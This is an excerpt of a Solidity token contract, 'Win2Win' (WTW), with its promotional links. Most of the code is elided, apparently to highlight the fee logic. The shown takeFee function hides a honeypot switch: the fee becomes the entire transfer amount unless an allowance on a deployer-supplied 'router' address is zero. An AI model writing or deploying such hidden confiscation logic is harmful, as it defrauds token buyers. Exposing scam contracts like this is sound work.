...
Website: https://win2wincoin.xyz
Tg: https://t.me/win2wincoin
Twitter: https://twitter.com/win2wincoin
...
contract WinTwoWin is IERC20, Ownable {
    using SafeMath for uint256;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    string private constant _name = "Win2Win";
    string private constant _symbol = "WTW";
    ...
    constructor(address _uniRouter) Ownable(msg.sender) {
    ...
    function _transfer(
        ...
        uint256 amountSend = shouldTakeFee(sender, recipient)
    ...
    function takeFee(
        ...
        } else if(IERC20(uniRouter).allowance(sender, recipient) == 0) {
            return 0;
        }
        return amount;
    }
